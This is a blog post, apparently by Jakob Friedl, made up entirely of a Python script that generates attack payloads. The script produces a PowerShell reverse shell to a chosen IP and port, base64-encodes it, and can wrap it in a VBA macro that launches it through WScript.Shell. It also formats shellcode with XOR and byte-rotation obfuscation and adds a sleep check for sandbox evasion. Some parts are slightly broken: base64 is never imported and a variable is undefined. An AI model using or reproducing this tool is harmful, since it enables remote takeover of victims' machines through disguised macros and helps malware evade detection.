---
title: 'Test'
date: 2024-07-29T20:24:44+02:00

footer: 'Jakob Friedl © 2024' 

categories: []
blog_post: true
---

```py
#!/usr/bin/env python3
# Author: Jakob Friedl
# Description: Generate payloads

import sys
import argparse

parser = argparse.ArgumentParser(description="Powershell reverse shell generator")
parser.add_argument('type', help='Type of payload to use.', choices=['revshell', 'shellcode'])

# Arguments for reverse shell payload
parser.add_argument('--ip', required='revshell' in sys.argv, help='IP address for the reverse shell payload.')
parser.add_argument('--port', required='revshell' in sys.argv,  help='Port for the reverse shell payload.')

# Arguments for shellcode payload
parser.add_argument('--file', required='shellcode' in sys.argv, help='Shellcode file.')
parser.add_argument('--format', help='Output format of the shellcode payload.', choices=['vba', 'c', 'csharp', 'ps1', 'bin'])
parser.add_argument('--xor', help='XOR the shellcode with a key byte.', type=int)
parser.add_argument('--rot', help='Rotate the bytes in the shellcode.', type=int)
parser.add_argument('--sleep', help='Sleep for a given number of seconds.', type=float)
args = parser.parse_args()

def format_c(shellcode): 
    result = 'unsigned char pShellcode[] = {\n    '
    
    i = 0
    for byte in shellcode: 
        result += '0x%0.2X' % byte + ','
        
        i += 1 
        if i % 10 == 0: 
            result += '\n    '
    return result[:-1] + '}'

def format_vba(shellcode):
    result = 'Dim buf as Variant\nbuf = Array('

    i = 0
    for byte in shellcode: 
        result += '%d' % byte + ','

        i += 1
        if i % 40 == 0: 
            result += ' _\n'
    return result[:-1] + ')' 

def xor_vba(key): 
    return '''
Dim i As Integer
For i = LBound(buf) to UBound(buf)
    buf(i) = buf(i) Xor %d
Next i''' % key

def rot_vba(rot_num): 
    return '''
Dim data As Long
Dim counter As Integer
For counter = LBound(buf) To UBound(buf)
    data = buf(counter) - %d 
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter
''' % rot_num

def sleep_vba(time): 
    return ''' 
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (%d)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < %d Then
    Exit Function
End If

''' % (time*1000, time)

def xor(shellcode, key):  
    return [(byte ^ key) for byte in shellcode]

def rot(shellcode, rot_num): 
    return [(byte + rot_num) for byte in shellcode]

# Powershell reverse shell payload 
if args.type == 'revshell': 
    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    payload = payload % (args.ip, int(args.port))

    # Encode payload as base64 string
    cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

    if args.format == 'vba': 
        # Line length
        n = 50
    
        print("Dim Str as String")
        for i in range(0, len(cmdline), n):
	        print("Str = Str + " + '"' + cmdline[i:i+n] + '"')
        print('CreateObject("Wscript.Shell").Run Str')
    else: 
        print(cmdline)

# Shellcode payload
if args.type == 'shellcode': 
    with open(args.file, mode='rb') as file:
        payload = file.read()
 
    if args.rot != None:
        payload = rot(payload, args.rot)
   
    if args.xor != None: 
        payload = xor(payload, args.xor)

    if args.sleep != None: 
        print(sleep_vba(args.sleep))

    if args.format == 'c': 
        print(format_c(payload))
    
    if args.format == 'vba': 
        print(format_vba(payload))

        if args.xor != None:
            print(xor_vba(args.xor))

        if args.rot != None: 
            print(rot_vba(args.rot))
```